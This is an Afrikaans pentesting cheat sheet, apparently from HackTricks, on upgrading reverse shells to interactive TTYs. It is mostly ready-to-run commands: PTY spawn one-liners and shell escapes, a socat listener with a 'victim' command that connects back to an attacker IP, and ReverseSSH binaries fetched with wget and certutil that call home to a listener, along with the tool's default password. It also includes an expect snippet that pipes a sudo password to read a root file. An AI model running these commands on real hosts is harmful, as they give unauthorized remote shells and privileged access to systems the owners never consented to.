# Volledige TTY's

## Volledige TTY

`/etc/shells` lys geldige padname vir login-shells en word deur sommige programme geraadpleeg; dit is nie 'n universele voorvereiste vir die toewysing van 'n PTY nie.<sup>[[3]](#references)[[4]](#references)</sup> As 'n program soos `pkexec` `SHELL` verwerp met `The value for the SHELL variable was not found in the /etc/shells file`, maak seker dat die presiese shell-pad (byvoorbeeld, `/bin/bash`) in `/etc/shells` voorkom.<sup>[[10]](#references)</sup> Die `CTRL+Z`/`fg`-herstelvolgorde hieronder gebruik Bash job control; as die huidige shell nie Bash is nie, begin Bash voordat jy daardie volgorde gebruik.<sup>[[7]](#references)</sup>

#### Python

Python se `pty.spawn` begin 'n program wat aan die huidige proses se standaardinvoer-, -uitvoer- en -foutstrome gekoppel is, wat Bash 'n pseudo-terminale in hierdie sessie gee.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Jy kan die **aantal** **rye** en **kolomme** kry deur **`stty -a`** uit te voer; `-a` druk alle huidige terminal-instellings. Die opdrag se uitvoer is terminal-spesifiek, dus gebruik die waardes wat deur die huidige sessie gerapporteer word.<sup>[[11]](#references)</sup>

#### script

Die `script`-nutsprogram teken ’n terminal-sessie op; hier verwerp `/dev/null` die typescript, onderdruk `-q` begin- en voltooiingsboodskappe, en voer `-c` Bash in plaas van die verstek-shell uit.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Na enige PTY-spawn-metode, suspendeer die Netcat-sessie en herstel dit met plaaslike raw mode, stel dan die afgeleë terminalomgewing en -afmetings in:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Die luisteraar gebruik die huidige terminaal in raw mode met plaaslike eggo gedeaktiveer en aanvaar TCP-verbindings op poort 4444. Die slagoffer-opdrag ken ’n pty toe, voeg stderr saam, skep ’n sessie, stuur SIGINT aan, en pas sane terminaalinstellings toe; voeg `ctty` by indien die kindproses ’n beherende terminaal benodig.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (old versions with `--interactive`): `!sh`

Die Nmap-escape is weergawe-spesifiek: Nmap het sy `--interactive`-modus in latere vrystellings verwyder, dus is `!sh` slegs op ou weergawes van toepassing.<sup>[[13]](#references)</sup>

## ReverseSSH

’n Gerieflike manier vir **interaktiewe shell-toegang**, sowel as **lêeroordragte** en **poortaanstuur**, is om die staties-gekoppelde SSH-bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te plaas.<sup>[[1]](#references)</sup>

Hieronder is ’n voorbeeld vir `x86` met die projek se gepubliseerde UPX-gekomprimeerde binary. Vir ander argitekture of release-artefakte, gebruik die [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) as navigasie.<sup>[[1]](#references)</sup>

1. Berei die plaaslike host voor om die inkomende SSH-verbinding op te vang. In listener-modus aktiveer `-l` die listener, en `-p 4444` kies die poort waarop dit die teiken se verbinding aanvaar.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux-teiken. Dra dieselfde `upx_reverse-sshx86`-artefak oor na `/dev/shm/reverse-ssh` en maak dit uitvoerbaar. Die teiken se `-p 4444` kies die luisterpoort hierbo, en `kali@10.0.0.2` verskaf die rekening en gasheer wat gebruik word om huis toe te skakel.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows-teiken. Volledig interactive PowerShell vereis Windows 10 build 17763; sien die [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Die Windows-voorbeeld gebruik `certutil` met `-f -urlcache`; Microsoft dokumenteer `-f` as die afdwinging van ’n URL-fetch en merk op dat beskikbare parameters per weergawe verskil, dus moet jy `certutil -?` nagaan indien hierdie vorm nie beskikbaar is nie.<sup>[[12]](#references)</sup>

- Nadat die reverse connection suksesvol is, bind ReverseSSH se reverse-mode listener by verstek aan poort `8888` (of aan die waarde wat met `-b` verskaf word), en inkomende connections aanvaar enige username met die verstekpassword `letmeinbrudipls`. Die remote shell loop met die privileges van die account wat `reverse-ssh(.exe)` geloods het.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) gradeer Unix-agtige reverse shells outomaties op na PTY, verander die grootte van Unix-agtige terminale, en teken shell-interaksies aan; vir Windows shells bied dit readline, maar nie intydse terminale-grootteverandering nie.<sup>[[2]](#references)</sup>

Voer `penelope` uit om by verstek op `0.0.0.0:4444` te luister; inkomende Unix-agtige shells kan dan outomaties opgegradeer en aangeteken word.<sup>[[2]](#references)</sup>

## No TTY

As jy om een of ander rede nie 'n volledige TTY kan verkry nie, **kan jy steeds interaksie hê met programme** wat gebruikersinvoer verwag. In die volgende voorbeeld skep Expect 'n proses vir `sudo`, wag vir sy wagwoordprompt, stuur die wagwoord, en gee beheer terug met `interact`; `sudo -S` lees sy wagwoord vanaf standaardinvoer. Gebruik dit slegs in 'n gemagtigde laboratorium en vermy dit om werklike geloofsbriewe in shell-geskiedenis of bronlêers te plaas.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Staties-gelinkte ssh-bediener met reverse shell-funksionaliteit vir CTF's en soortgelyke doeleindes](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell-hanteerder wat ’n paar dinge outomatiseer om die lewe makliker te maak](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python-dokumentasie](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash-verwysingshandleiding — Job Control](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap-wysigingslogboek](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
